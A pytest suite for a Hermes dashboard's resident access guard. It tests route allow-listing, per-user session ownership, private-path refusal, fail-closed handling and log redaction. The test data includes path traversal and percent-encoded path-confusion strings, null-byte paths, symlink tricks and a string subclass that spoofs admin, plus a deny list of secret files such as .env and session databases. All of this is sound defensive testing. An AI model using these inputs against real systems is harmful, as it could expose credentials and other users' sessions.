"""SEC-1: the resident guard. Residents get a named set of dashboard features; landing admins get all.

Two layers, as in `test_archive_token.py`. The first half needs no Hermes (CI has none): small
stand-ins for Hermes's cookie gate, ticket store, socket auth and gateway dispatch drive the real
wrappers from `_resident_guard.py`, so every decision is checked end to end. The second half
(`test_hermes_*`) runs the real gate, tickets, sockets, gateway and `web_server` app and is skipped
where `hermes_cli` is not importable; run it with the pinned Hermes source on PYTHONPATH
(README.md, "Tests"). The tests pin the design (every route and method the real app mounts is on the
list or refused, and the set Hermes mounts is pinned), not the list itself.
"""
import asyncio
import importlib.util
import logging
import os
import re
import urllib.parse
from pathlib import Path
from types import SimpleNamespace

import pytest

HERE = Path(__file__).parent

# ---- HTTP harness --------------------------------------------------------------------------------


class Headers:
    """Case-insensitive, mutable in place, like Starlette's MutableHeaders over raw_headers."""

    def __init__(self, pairs=()):
        self._pairs = [[k.lower(), v] for k, v in pairs]

    def get(self, name, default=None):
        name = name.lower()
        return next((v for k, v in self._pairs if k == name), default)

    def __setitem__(self, name, value):
        name = name.lower()
        for pair in self._pairs:
            if pair[0] == name:
                pair[1] = value
                return
        self._pairs.append([name, value])


class Request:
    """What the wrapper reads from a Starlette request, built the way uvicorn + Starlette do:
    `scope["path"]` is the percent-decoded target path (the router dispatches on it) and
    `url.path` is that path re-parsed as a URL (Hermes's gate matches on it)."""

    def __init__(self, method, target, headers=()):
        raw_path, _, query = target.partition("?")
        decoded = urllib.parse.unquote(raw_path)
        url = "http://testserver" + decoded + ("?" + query if query else "")
        self.method = method
        self.scope = {"type": "http", "method": method, "path": decoded, "raw_path": raw_path.encode(),
                      "query_string": query.encode()}
        self.url = SimpleNamespace(path=urllib.parse.urlsplit(url).path)
        self.headers = Headers(headers)
        self.state = SimpleNamespace()


class Response:
    def __init__(self, status, body, content_type="application/json"):
        self.status_code = status
        self.body = body
        self.headers = Headers([("content-type", content_type)])


def json_response(content, status_code=200):
    return Response(status_code, content)


class Streamed:
    """Starlette's `_StreamingResponse` as `call_next` hands it to a middleware."""

    def __init__(self, chunks, content_type="text/html; charset=utf-8", status=200, length=True):
        self.status_code = status
        pairs = [("content-type", content_type)]
        if length:
            pairs.append(("content-length", str(sum(len(c) for c in chunks if isinstance(c, bytes)))))
        self.headers = Headers(pairs)

        async def gen():
            for chunk in chunks:
                if isinstance(chunk, Exception):
                    raise chunk
                yield chunk

        self.body_iterator = gen()

    def read(self):
        async def collect():
            return [c async for c in self.body_iterator]

        return asyncio.run(collect())


def hide_and_read(guard, streamed):
    """The hide and the send in one event loop, as in a server."""

    async def run():
        out = await guard.hide_plugins_page(streamed)
        return out, [c async for c in out.body_iterator]

    return asyncio.run(run())


def session(provider="edgecity", org_id="owner", email="someone@example.org"):
    return SimpleNamespace(user_id="u1", email=email, display_name=email, org_id=org_id, provider=provider,
                           expires_at=0, access_token="at-secret-value", refresh_token="rt-secret-value")


OWNER = session(org_id="owner", email="owner@example.org")
ADMIN = session(org_id="admin", email="admin@example.org")

INDEX = (b'<!doctype html><html><head><title>Hermes</title><script>window.__HERMES_BASE_PATH__="";'
         b"window.__HERMES_AUTH_REQUIRED__=true;</script></head><body><div id=root></div></body></html>")
LOGIN = b"<!doctype html><html><head><title>Sign in</title></head><body><form></form></body></html>"


class Dashboard:
    """Wrapper -> stand-in cookie gate -> router.

    The gate mirrors `gated_auth_middleware`: switched off it hands everything on; a token
    principal or a public path passes with no session; otherwise a cookie or a session bearer
    names a session (set on `request.state.session` before `call_next`) or the request gets the
    gate's own 401. The router 200s every path (the SPA index for non-API paths) and records the
    role the guard put in context, so a 403 can only come from the wrapper."""

    PUBLIC = ("/login", "/auth/", "/api/auth/providers", "/api/status", "/api/health")

    def __init__(self, guard, *, auth_required=True):
        self.mod = guard
        self.auth_required = auth_required
        self.sessions = {}
        self.routed = []
        self.roles = []
        self.gate_calls = 0
        self.module = SimpleNamespace(gated_auth_middleware=self.gate, JSONResponse=json_response)
        assert guard.install(self.module) is True
        self.list_calls = []
        guard.set_session_list(list_page(LIST_ROWS, self.list_calls))
        self.html = INDEX

    async def gate(self, request, call_next):
        self.gate_calls += 1
        if not self.auth_required:
            return await call_next(request)
        if getattr(request.state, "token_authenticated", False) or request.url.path.startswith(self.PUBLIC):
            return await call_next(request)
        auth = request.headers.get("authorization") or ""
        cookie = request.headers.get("cookie") or ""
        key = auth[7:] if auth.lower().startswith("bearer ") else cookie.partition("=")[2]
        found = self.sessions.get(key) if key else None
        if found is None:
            return Response(401, {"error": "unauthenticated", "detail": "Unauthorized", "reason": "no_cookie", "by": "gate"})
        request.state.session = found
        return await call_next(request)

    async def router(self, request):
        self.routed.append((request.method, request.scope["path"]))
        self.roles.append(self.mod._REQUEST_ROLE.get())
        if request.scope["path"] == "/login":
            return Response(200, LOGIN, "text/html; charset=utf-8")
        if request.scope["path"].startswith("/api/"):
            return Response(200, {"path": request.scope["path"]})
        resp = Response(200, self.html, "text/html; charset=utf-8")
        resp.headers["content-length"] = str(len(self.html))
        return resp

    def login(self, who):
        key = f"cookie-{len(self.sessions)}"
        self.sessions[key] = who
        return [("Cookie", f"hermes_session_at={key}")]

    def request(self, method, target, *, headers=(), token_principal=False):
        req = Request(method, target, headers)
        if token_principal:
            req.state.token_principal = SimpleNamespace(principal="svc", provider="edgecity-archive", scopes=())
            req.state.token_authenticated = True
        resp = asyncio.run(self.module.gated_auth_middleware(req, self.router))
        return resp, req


#: Stored sessions the stand-in lookup knows (Hermes's `sessions` rows: id, user_id, source).
SESSION_ROWS = {
    "abc123": {"id": "abc123", "user_id": "edgecity:u1", "source": "tool"},        # the resident's dashboard chat
    "tg1": {"id": "tg1", "user_id": "5550001", "source": "telegram"},             # the resident on Telegram
    "adm1": {"id": "adm1", "user_id": "edgecity:admin-9", "source": "tool"},      # a landing admin's chat
    "pty1": {"id": "pty1", "user_id": None, "source": "tui"},                     # the admin terminal's
    "cron1": {"id": "cron1", "user_id": None, "source": "cron"},
    "tg-adm": {"id": "tg-adm", "user_id": "edgecity:admin-9", "source": "telegram"},
}


#: Hermes's `GET /api/sessions` rows for the stored sessions above (compact: no system prompt), plus
#: the shapes S-r3-1 names: no `user_id`, no `source`, neither.
LIST_ROWS = [
    {**row, "title": f"title of {sid}", "preview": f"first message of {sid}", "message_count": 1}
    for sid, row in SESSION_ROWS.items()
] + [
    {"id": "no-user", "source": "tool", "title": "t", "preview": "first message of no-user"},
    {"id": "no-source", "user_id": "edgecity:admin-9", "title": "t", "preview": "first message of no-source"},
    {"id": "bare", "title": "t", "preview": "first message of bare"},
]


def list_page(rows, calls=None):
    """Hermes's list handler in miniature: `rows` in order, `limit`/`offset` applied, the store's
    total, as `__init__._session_list_page` hands the guard one page."""

    def page(query, limit, offset):
        if calls is not None:
            calls.append((dict(query), limit, offset))
        return {"sessions": [dict(r) for r in rows[offset:offset + limit]], "total": len(rows), "limit": limit,
                "offset": offset, "storage": {}}

    return page


def session_lookup(rows=SESSION_ROWS):
    def lookup(session_id, profile=None, *, prefix):
        if session_id in rows:
            return rows[session_id]
        if prefix:
            found = [r for k, r in rows.items() if k.startswith(session_id)]
            return found[0] if len(found) == 1 else None
        return None

    return lookup


def session_owners(rows=SESSION_ROWS):
    """`__init__._session_owners` in miniature: the stored owner fields of each known id."""

    def owners(ids, profile=None):
        return {i: rows[i] for i in ids if i in rows}

    return owners


@pytest.fixture
def dash(guard):
    guard.set_session_lookup(session_lookup())
    return Dashboard(guard)


def forbidden(resp, reason="admin_only"):
    return resp.status_code == 403 and isinstance(resp.body, dict) and resp.body.get("reason") == reason


#: Not on the list: every one is a 403 for a resident. The refuted siblings (SEC1-refute.md M1-M5,
#: S1-S4) and a sample of the rest.
NOT_LISTED = [
    ("POST", "/api/dashboard/agent-plugins/install"),
    ("POST", "/api/dashboard/agent-plugins/av-approval/disable"),
    ("DELETE", "/api/dashboard/agent-plugins/av-approval"),
    ("PUT", "/api/dashboard/plugin-providers"),
    ("GET", "/api/dashboard/plugins/hub"),
    ("GET", "/api/dashboard/plugins/catalog"),
    ("PUT", "/api/memory/provider"),
    ("POST", "/api/memory/providers/x/setup"),
    ("PUT", "/api/config"),                        # M2
    ("GET", "/api/config"),
    ("PUT", "/api/config/raw"),                    # M3
    ("GET", "/api/config/raw"),
    ("POST", "/api/fs/write-text"),                # M3
    ("GET", "/api/fs/download?path=/tmp/x"),       # M4a
    ("GET", "/api/fs/read-data-url?path=/tmp/x"),
    ("GET", "/api/fs/read-text?path=/tmp/x"),
    ("GET", "/api/fs/list?path=/tmp"),
    ("GET", "/api/files"),
    ("POST", "/api/files/upload"),
    ("DELETE", "/api/files"),
    ("PUT", "/api/env"),                           # M4b, S4
    ("DELETE", "/api/env"),
    ("GET", "/api/env"),
    ("POST", "/api/env/reveal"),
    ("POST", "/api/ops/hooks"),                    # S1
    ("DELETE", "/api/ops/hooks"),
    ("POST", "/api/ops/import"),
    ("POST", "/api/gateway/restart"),
    ("POST", "/api/hermes/update"),
    ("POST", "/api/mcp/servers"),                  # S2
    ("POST", "/api/mcp/catalog/install"),
    ("POST", "/api/skills/hub/install"),
    ("POST", "/api/skills"),
    ("POST", "/api/local-models/runtime/install"),
    ("POST", "/api/profiles/import"),
    ("POST", "/api/profiles"),
    ("POST", "/api/credentials/pool"),
    ("POST", "/api/cron/jobs"),
    ("POST", "/api/pairing/approve"),
    ("PUT", "/api/dashboard/theme"),
    ("PUT", "/api/dashboard/font"),
    ("POST", "/api/sessions/import"),
    ("POST", "/api/sessions/owner-backfill"),
    ("GET", "/api/sessions/search?q=plugins"),     # S-new-1: reads across sessions
    ("GET", "/api/sessions/stats"),                # S-r3-1: box-wide counts
    ("GET", "/api/sessions/empty/count"),          # S-r3-1: box-wide count
    ("GET", "/api/sessions?full=1"),               # S-r3-1: every row's system prompt
    ("GET", "/api/sessions?full=true&limit=5"),
    ("GET", "/api/sessions?full=0&full=yes"),
    ("POST", "/api/sessions/bulk-delete"),         # S-new-1: deletes across sessions
    ("DELETE", "/api/sessions/empty"),
    ("POST", "/api/sessions/prune"),
    ("GET", "/api/logs"),
    ("GET", "/api/plugins/kanban/board"),
    ("GET", "/docs"),
    ("GET", "/openapi.json"),
    ("GET", "/redoc"),
    ("GET", "/api/chat/workspaces"),
    ("POST", "/api/auth/me"),
    ("OPTIONS", "/api/sessions"),
    ("POST", "/sessions"),
    ("PUT", "/"),
    ("GET", "/api/sessions/"),
    ("GET", "/api/sessions/x/messages/"),
    ("GET", "/api/sessions//messages"),
    ("GET", "/api/sessions/x/messages/extra"),
    ("GET", "/api/plugins/av-approval"),
    ("GET", "/api/plugins/av-approval/../kanban/x"),
    ("GET", "/api/nonexistent"),
    ("GET", "/api"),
]

#: On the list: a resident reaches the route.
LISTED = [
    ("GET", "/"),
    ("GET", "/sessions"),
    ("GET", "/chat"),
    ("GET", "/plugins"),
    ("GET", "/assets/index-abc.js"),
    ("HEAD", "/assets/index-abc.js"),
    ("GET", "/favicon.ico"),
    ("GET", "/fonts/x.woff2"),
    ("GET", "/dashboard-plugins/kanban/dist/index.js"),
    ("GET", "/login"),
    ("GET", "/auth/login"),
    ("POST", "/auth/logout"),
    ("POST", "/auth/password-login"),
    ("GET", "/api/auth/me"),
    ("POST", "/api/auth/ws-ticket"),
    ("GET", "/api/status"),
    ("GET", "/api/dashboard/plugins"),
    ("GET", "/api/dashboard/themes"),
    ("GET", "/api/profiles"),
    ("GET", "/api/profiles/active"),
    ("GET", "/api/sessions"),
    ("GET", "/api/sessions?limit=20&offset=0&order=recent&profile=default"),
    ("GET", "/api/sessions?full=0"),
    ("GET", "/api/sessions?full=false&order=recent"),
    ("GET", "/api/sessions/abc123"),
    ("GET", "/api/sessions/abc123/messages"),
    ("GET", "/api/sessions/abc123/messages/around"),
    ("GET", "/api/sessions/abc123/timeline"),
    ("GET", "/api/sessions/abc123/latest-descendant"),
    ("GET", "/api/sessions/abc123/export"),
    ("GET", "/api/sessions/abc1/messages"),
    ("GET", "/api/sessions/tg1/messages?profile=default"),
    ("PATCH", "/api/sessions/abc123"),
    ("DELETE", "/api/sessions/tg1"),
    ("POST", "/api/chat/image-upload"),
    ("POST", "/api/plugins/av-approval/cards/x/approve"),
]


@pytest.mark.parametrize("method,target", NOT_LISTED)
def test_an_owner_gets_403_on_everything_not_listed(dash, method, target):
    resp, _ = dash.request(method, target, headers=dash.login(OWNER))
    assert forbidden(resp), (method, target, resp.status_code, resp.body)
    assert dash.routed == []


@pytest.mark.parametrize("method,target", LISTED)
def test_an_owner_reaches_every_listed_route(dash, method, target):
    resp, req = dash.request(method, target, headers=dash.login(OWNER))
    assert resp.status_code == 200, (method, target, resp.body)
    assert dash.routed == [(method, req.scope["path"])]
    assert dash.roles == ["resident"]


@pytest.mark.parametrize("method,target", NOT_LISTED + LISTED)
def test_an_edgecity_admin_reaches_everything(dash, method, target):
    resp, req = dash.request(method, target, headers=dash.login(ADMIN))
    assert resp.status_code == 200
    # The gate reads no cookie on its public paths, so an admin arrives there without a session.
    public = req.url.path.startswith(Dashboard.PUBLIC)
    assert dash.routed == [(method, req.scope["path"])] and dash.roles == ["resident" if public else "admin"]


# ---- S-new-1 on HTTP: a route that names one stored session answers only for the resident's own --


@pytest.mark.parametrize("session_id,ok", [
    ("abc123", True),     # its own dashboard login's
    ("abc1", True),       # a unique prefix of it, resolved as the handler resolves it
    ("tg1", True),        # the box's Telegram channel
    ("adm1", False),      # a landing admin's dashboard chat
    ("pty1", False),      # the admin terminal's (no login)
    ("cron1", False),     # cron's (no login)
    ("tg-adm", False),    # a messaging source, but another dashboard login's
    ("nope", False),      # unknown
    ("a", False),         # an ambiguous prefix
])
def test_a_session_route_answers_a_resident_only_for_its_own_sessions(dash, session_id, ok):
    for method, suffix in (("GET", ""), ("GET", "/messages"), ("GET", "/export"), ("GET", "/timeline"),
                           ("GET", "/messages/around"), ("GET", "/latest-descendant"), ("PATCH", ""), ("DELETE", "")):
        dash.routed.clear()
        resp, _ = dash.request(method, f"/api/sessions/{session_id}{suffix}", headers=dash.login(OWNER))
        if ok:
            assert resp.status_code == 200, (method, suffix, resp.body)
        else:
            assert forbidden(resp, "not_own_session") and dash.routed == [], (method, suffix, resp.body)


def test_an_admin_and_the_archive_bearer_read_every_session(dash):
    for session_id in ("adm1", "pty1", "nope"):
        assert dash.request("GET", f"/api/sessions/{session_id}/messages", headers=dash.login(ADMIN))[0].status_code == 200
        assert dash.request("GET", f"/api/sessions/{session_id}/messages", token_principal=True)[0].status_code == 200


def test_a_hermes_subroute_word_is_never_a_session_id(dash):
    for target in ("/api/sessions/search", "/api/sessions/stats/messages", "/api/sessions/prune",
                   "/api/sessions/import", "/api/sessions/owner-backfill/export"):
        resp, _ = dash.request("GET", target, headers=dash.login(OWNER))
        assert forbidden(resp), target


def test_without_a_session_lookup_every_session_route_is_refused(dash):
    dash.mod.set_session_lookup(None)
    resp, _ = dash.request("GET", "/api/sessions/abc123/messages", headers=dash.login(OWNER))
    assert forbidden(resp, "not_own_session") and dash.routed == []
    assert dash.request("GET", "/api/sessions", headers=dash.login(OWNER))[0].status_code == 200


def test_a_failing_session_lookup_is_a_403(dash):
    def boom(*a, **k):
        raise OSError("state.db unreadable")

    dash.mod.set_session_lookup(boom)
    resp, _ = dash.request("GET", "/api/sessions/abc123", headers=dash.login(OWNER))
    assert resp.status_code == 403 and dash.routed == []


def test_the_lookup_gets_the_requests_profile(dash):
    seen = []
    dash.mod.set_session_lookup(lambda sid, profile=None, *, prefix: seen.append((sid, profile, prefix)) or None)
    dash.request("GET", "/api/sessions/abc123/messages?profile=worker", headers=dash.login(OWNER))
    assert seen == [("abc123", "worker", True)]


@pytest.mark.parametrize("row,login,ok", [
    ({"user_id": "edgecity:u1", "source": "tool"}, "edgecity:u1", True),
    ({"user_id": "edgecity:u1", "source": "tool"}, None, False),
    ({"user_id": "edgecity:u2", "source": "tool"}, "edgecity:u1", False),
    ({"user_id": "5550001", "source": "telegram"}, None, True),
    ({"user_id": None, "source": "telegram"}, "edgecity:u1", True),
    ({"user_id": "basic:alice", "source": "telegram"}, "edgecity:u1", False),
    ({"user_id": None, "source": "tui"}, "edgecity:u1", False),
    ({"user_id": None, "source": "cron"}, "edgecity:u1", False),
    ({"user_id": None, "source": "Telegram"}, "edgecity:u1", False),
    (None, "edgecity:u1", False),
    ("abc", "edgecity:u1", False),
])
def test_session_visible(guard, row, login, ok):
    assert guard.session_visible(row, login) is ok


def test_a_session_bearer_is_judged_like_a_cookie(dash):
    dash.sessions["bearer-owner"] = OWNER
    dash.sessions["bearer-admin"] = ADMIN
    owner = [("Authorization", "Bearer bearer-owner")]
    admin = [("Authorization", "Bearer bearer-admin")]
    assert forbidden(dash.request("PUT", "/api/config", headers=owner)[0])
    assert dash.request("GET", "/api/sessions", headers=owner)[0].status_code == 200
    assert dash.request("PUT", "/api/config", headers=admin)[0].status_code == 200


@pytest.mark.parametrize("who", [
    session(provider="edgecity", org_id="owner"),
    session(provider="edgecity", org_id="Admin"),
    session(provider="edgecity", org_id="admin "),
    session(provider="edgecity", org_id=""),
    session(provider="edgecity", org_id=None),
    session(provider="basic", org_id="admin"),
    session(provider="edgecity-archive", org_id="admin"),
    session(provider="EdgeCity", org_id="admin"),
    session(provider=None, org_id="admin"),
    SimpleNamespace(user_id="u1"),
])
def test_nothing_but_provider_edgecity_and_role_admin_is_admin(dash, who):
    assert forbidden(dash.request("PUT", "/api/config", headers=dash.login(who))[0])
    assert dash.request("GET", "/api/sessions", headers=dash.login(who))[0].status_code == 200
    assert dash.roles == ["resident"]


def test_a_str_subclass_is_not_admin(dash):
    class Sneaky(str):
        def __eq__(self, other):
            return True

        __hash__ = str.__hash__

    who = session(provider=Sneaky("edgecity"), org_id=Sneaky("admin"))
    assert forbidden(dash.request("PUT", "/api/config", headers=dash.login(who))[0])


def test_a_token_principal_gets_only_the_list(dash):
    """The archive job's bearer (`_archive.py`) reaches the two session reads it is scoped to; the
    guard treats it as a resident everywhere else."""
    assert dash.request("GET", "/api/sessions", token_principal=True)[0].status_code == 200
    assert dash.request("GET", "/api/sessions/abc/messages", token_principal=True)[0].status_code == 200
    assert forbidden(dash.request("PUT", "/api/config", token_principal=True)[0])
    assert forbidden(dash.request("POST", "/api/dashboard/agent-plugins/install", token_principal=True)[0])


def test_a_token_principal_beside_an_admin_session_is_still_not_admin(dash):
    req = Request("PUT", "/api/config")
    req.state.session = ADMIN
    req.state.token_authenticated = True

    async def gate_passes(request, call_next):
        return await call_next(request)

    wrapper = dash.mod.make_gate_wrapper(gate_passes, json_response=json_response)
    assert forbidden(asyncio.run(wrapper(req, dash.router)))


@pytest.mark.parametrize("method,target", NOT_LISTED[:6] + [("GET", "/api/sessions"), ("GET", "/sessions")])
def test_without_a_session_the_gates_own_401_stands(dash, method, target):
    resp, _ = dash.request(method, target)
    assert resp.status_code == 401 and resp.body["by"] == "gate"
    assert dash.routed == []


def test_public_paths_reach_the_guard_without_a_session_and_pass_only_when_listed(dash):
    """The gate hands public paths on with no session, admins' included."""
    assert dash.request("GET", "/api/status")[0].status_code == 200
    assert dash.request("GET", "/login")[0].body == LOGIN
    assert dash.request("POST", "/auth/password-login")[0].status_code == 200
    assert forbidden(dash.request("PUT", "/api/status")[0])
    assert forbidden(dash.request("GET", "/auth/unknown")[0])


@pytest.mark.parametrize("method,target", NOT_LISTED[:10])
def test_with_the_gate_off_there_is_no_session_and_only_the_list_passes(guard, method, target):
    loopback = Dashboard(guard, auth_required=False)
    assert forbidden(loopback.request(method, target)[0])
    assert loopback.request("GET", "/api/sessions")[0].status_code == 200
    assert loopback.routed == [("GET", "/api/sessions")]


@pytest.mark.parametrize("target", [
    "/api/sessions%3F/x",       # the URL path ends at the decoded ?, the scope path does not
    "/api/sessions%23x",
    "/api/sessions/x%2Fy/messages",
])
def test_a_path_the_url_and_the_scope_disagree_on_must_be_listed_both_ways(dash, target):
    resp, _ = dash.request("GET", target, headers=dash.login(OWNER))
    assert forbidden(resp) and dash.routed == []


def test_patterns_match_on_whole_segments(guard):
    m = guard.pattern_matches
    assert m("/api/sessions/{id}", "/api/sessions/abc")
    assert not m("/api/sessions/{id}", "/api/sessions/")
    assert not m("/api/sessions/{id}", "/api/sessions/abc/")
    assert not m("/api/sessions/{id}", "/api/sessions/..")
    assert not m("/api/sessions/{id}", "/api/sessionsx/abc")
    assert not m("/api/sessions/{id}", "api/sessions/abc")
    assert not m("/api/sessions/{id}", None)
    assert m("/api/plugins/av-approval/**", "/api/plugins/av-approval/x/y")
    assert not m("/api/plugins/av-approval/**", "/api/plugins/av-approval")
    assert not m("/api/plugins/av-approval/**", "/api/plugins/av-approval/")
    assert not m("/api/plugins/av-approval/**", "/api/plugins/av-approval/../kanban")
    assert not m("/api/plugins/av-approval/**", "/api/plugins/av-approvalx/y")
    spa = guard.SPA
    assert m(spa, "/") and m(spa, "/sessions") and m(spa, "/sessions/") and m(spa, "/assets/a.js")
    for reserved in ("/api", "/api/x", "/auth/x", "/docs", "/redoc", "/openapi.json", "/dashboard-plugins/x/y", "/login"):
        assert not m(spa, reserved), reserved
    assert not m(spa, "//api/x") and not m(spa, "/x/../api") and not m(spa, "/..")


def test_every_table_row_is_well_formed_and_explained(guard):
    for methods, pattern, why in guard.RESIDENT_HTTP:
        assert methods and methods <= {"GET", "HEAD", "POST", "PUT", "PATCH", "DELETE"}
        assert pattern == guard.SPA or pattern.startswith("/")
        assert why.strip()
    known = {guard.BYTES_ONLY, guard.NO_ALWAYS, guard.OWN_SESSION, guard.OWN_SESSION_IF_GIVEN, guard.OWN_STORED,
             guard.OWN_REQUEST, guard.PINNED_CWD, guard.NO_FILE_REFS, guard.ANSWER, guard.OWN_ROWS}
    for name, (rules, why) in guard.RESIDENT_GATEWAY_METHODS.items():
        assert isinstance(rules, tuple) and set(rules) <= known and why.strip(), name
    for source, why in guard.RESIDENT_SESSION_SOURCES.items():
        assert source == source.strip().lower() and why.strip()
    assert set(guard.RESIDENT_WS_PATHS) == {"/api/ws", "/api/pty"}


def test_head_follows_get_and_options_is_not_listed(dash):
    assert dash.request("HEAD", "/api/sessions", headers=dash.login(OWNER))[0].status_code == 200
    assert forbidden(dash.request("OPTIONS", "/api/sessions", headers=dash.login(OWNER))[0])
    assert forbidden(dash.request("HEAD", "/api/config", headers=dash.login(OWNER))[0])


# ---- private paths (design rule 3) ---------------------------------------------------------------


@pytest.fixture
def home(tmp_path, monkeypatch):
    home = tmp_path / "hermes-home"
    (home / ".dashboard-auth-edgecity").mkdir(parents=True)
    (home / ".dashboard-auth-edgecity" / "sessions.sqlite3").write_bytes(b"x")
    (home / "plugins" / "av-events").mkdir(parents=True)
    (home / "workspace").mkdir()
    (home / "workspace" / "notes.md").write_text("hi")
    monkeypatch.setenv("HERMES_HOME", str(home))
    return home


@pytest.mark.parametrize("value", [
    "{home}/.dashboard-auth-edgecity/sessions.sqlite3",
    "{home}/.dashboard-auth-edgecity",
    "{home}/.env",
    "{home}/profiles/work/.env",
    "{home}/.env.local",
    "{home}/.op.env",
    "/srv/app/prod.env",
    "{home}/state.db",
    "{home}/state.db-wal",
    "{home}/config.yaml",
    "{home}/plugins/av-events/__init__.py",
    "{home}/hooks/pre.sh",
    "{home}/agent-hooks/x",
    "{home}/hermes-agent/hermes_cli/main.py",
    "{home}/workspace/../.env",
    "{home}/workspace/../.dashboard-auth-edgecity/sessions.sqlite3",
    "file://{home}/.env",
    "file://{home}/%2Edashboard-auth-edgecity/sessions.sqlite3",
    "~/.hermes/.env",
    "plugins/x",
    ".dashboard-auth-edgecity/sessions.sqlite3",
    "{home}/.ENV",
    "{home}/x\x00.md",
])
def test_private_paths(guard, home, value):
    assert guard.private_path(value.format(home=home)) is True


@pytest.mark.parametrize("value", ["{home}/workspace/notes.md", "{home}/workspace", "/tmp/report.pdf", "", "notes.md",
                                   "{home}/images/dashboard_1.png"])
def test_not_private_paths(guard, home, value):
    assert guard.private_path(value.format(home=home)) is False


def test_a_symlink_into_a_private_tree_is_private(guard, home, tmp_path):
    link = tmp_path / "innocent"
    link.symlink_to(home / ".dashboard-auth-edgecity")
    assert guard.private_path(str(link / "sessions.sqlite3")) is True
    plain = tmp_path / "plain-link"
    plain.symlink_to(home / "workspace")
    assert guard.private_path(str(plain / "notes.md")) is False


def test_the_hermes_checkout_is_private_wherever_it_is(guard, home, tmp_path):
    checkout = tmp_path / "opt" / "hermes-src"
    (checkout / "hermes_cli").mkdir(parents=True)
    assert guard.private_path(str(checkout / "hermes_cli" / "main.py")) is False
    guard.set_private_roots([checkout])
    assert guard.private_path(str(checkout / "hermes_cli" / "main.py")) is True


@pytest.mark.parametrize("value", [None, 7, b"/x", ["/x"]])
def test_a_value_that_is_not_a_path_string_is_private(guard, value):
    assert guard.private_path(value) is True


def test_a_listed_route_naming_a_private_path_is_refused_for_a_resident(dash, home):
    owner = dash.login(OWNER)
    for target in (f"/api/sessions?path={home}/.env", f"/api/sessions/abc123?q=x&cwd={home}/plugins",
                   "/api/sessions/abc123/messages?q=/x/../.dashboard-auth-edgecity/sessions.sqlite3",
                   f"/api/sessions?x=file://{home}/.env", "/.env", "/assets/.env.local",
                   "/hermes-agent/x", "/api/plugins/av-approval/state.db"):
        resp, _ = dash.request("GET", target, headers=owner)
        assert forbidden(resp, "private_path"), target
    assert dash.routed == []
    assert dash.request("GET", f"/api/sessions?path={home}/.env", headers=dash.login(ADMIN))[0].status_code == 200
    assert dash.request("GET", "/api/sessions/abc123?q=plugins", headers=owner)[0].status_code == 200


# ---- fail closed ---------------------------------------------------------------------------------


def test_a_raising_session_is_a_403_never_a_pass_or_a_500(dash):
    class Exploding:
        @property
        def provider(self):
            raise RuntimeError("bad session")

    resp, _ = dash.request("GET", "/api/sessions", headers=dash.login(Exploding()))
    assert forbidden(resp)
    assert dash.mod.counts() == {"denied_error": 1}


def test_a_raising_decision_is_a_403(dash, monkeypatch):
    def boom(state):
        raise RuntimeError("decision broke")

    monkeypatch.setattr(dash.mod, "admin_code", boom)
    for who in (OWNER, ADMIN):
        assert forbidden(dash.request("GET", "/api/sessions", headers=dash.login(who))[0])
        assert forbidden(dash.request("PUT", "/api/config", headers=dash.login(who))[0])
    assert dash.routed == []


def test_a_raising_request_is_a_403(dash):
    req = Request("GET", "/api/sessions")

    class BadScope(dict):
        def get(self, *a, **k):
            raise RuntimeError("no scope")

    req.scope = BadScope(req.scope)
    req.state.session = OWNER

    async def gate_passes(request, call_next):
        return await call_next(request)

    wrapper = dash.mod.make_gate_wrapper(gate_passes, json_response=json_response)
    assert forbidden(asyncio.run(wrapper(req, dash.router))) and dash.routed == []


def test_the_role_context_is_reset_after_the_request(dash):
    dash.request("GET", "/api/sessions", headers=dash.login(ADMIN))
    assert dash.roles == ["admin"] and dash.mod._REQUEST_ROLE.get() is None


# ---- one layer -----------------------------------------------------------------------------------


def load_copy(guard, name):
    spec = importlib.util.spec_from_file_location(name, Path(guard.__file__))
    copy = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(copy)
    return copy


def test_install_keeps_exactly_one_layer(guard):
    async def gate(request, call_next):
        return await call_next(request)

    module = SimpleNamespace(gated_auth_middleware=gate, JSONResponse=json_response)
    assert guard.install(module) is True
    first = module.gated_auth_middleware
    assert first is not gate and first._edgecity_resident_guard and first._edgecity_original is gate
    assert guard.install(module) is True
    assert module.gated_auth_middleware._edgecity_original is gate  # replaced, not stacked
    copy = load_copy(guard, "edgecity_test_resident_guard_copy")
    assert copy.install(module) is True
    assert module.gated_auth_middleware._edgecity_original is gate
    assert guard.install(SimpleNamespace()) is False
    bare = SimpleNamespace(gated_auth_middleware=gate)
    assert guard.install(bare) is False and bare.gated_auth_middleware is gate
    assert guard.install(bare, json_response=json_response) is True


def test_install_replaces_a_1_2_0_wrapper_instead_of_stacking_on_it(guard):
    async def gate(request, call_next):
        return await call_next(request)

    async def old_wrapper(request, call_next):  # what 1.2.0's _plugins_admin installed
        return await gate(request, call_next)

    old_wrapper._edgecity_plugins_admin = True
    old_wrapper._edgecity_original = gate
    module = SimpleNamespace(gated_auth_middleware=old_wrapper, JSONResponse=json_response)
    assert guard.install(module) is True
    assert module.gated_auth_middleware._edgecity_original is gate


def test_one_layer_means_one_decision_per_request(dash):
    dash.mod.install(dash.module)
    dash.mod.install(dash.module)
    dash.request("PUT", "/api/config", headers=dash.login(OWNER))
    assert dash.gate_calls == 1 and dash.mod.counts() == {"denied_not_listed": 1}


# ---- logs ----------------------------------------------------------------------------------------


def test_logs_carry_codes_and_counts_never_the_email_token_or_path(dash, caplog, home):
    caplog.set_level(logging.DEBUG)
    dash.request("PUT", "/api/config", headers=dash.login(OWNER))
    dash.request("PUT", "/api/config", headers=dash.login(ADMIN))
    dash.request("GET", f"/api/sessions?path={home}/.env", headers=dash.login(OWNER))
    dash.request("GET", "/api/sessions", headers=dash.login(OWNER))
    text = caplog.text
    for secret in ("owner@example.org", "admin@example.org", "at-secret-value", "rt-secret-value", "cookie-0",
                   str(home), "/api/config"):
        assert secret not in text
    records = {r.getMessage().split(" (")[0].rsplit(" ", 1)[-1]: r.levelno for r in caplog.records
               if r.name == "dashboard-auth-edgecity.resident-guard"}
    assert records == {"denied_not_listed": logging.INFO, "admin_allowed": logging.DEBUG,
                       "denied_private_path": logging.INFO, "resident_allowed": logging.DEBUG,
                       "resident_list_filtered": logging.DEBUG}
    assert "denied_not_listed=1" in text


# ---- the Plugins page hide (kept from 1.2.0; the 403s are the security property) ----------------


def test_the_spa_index_under_an_owner_gets_the_hide_before_head_end(dash):
    resp, _ = dash.request("GET", "/plugins", headers=dash.login(OWNER))
    body = resp.body
    assert body == INDEX.replace(b"</head>", dash.mod.HIDE_SNIPPET + b"</head>", 1)
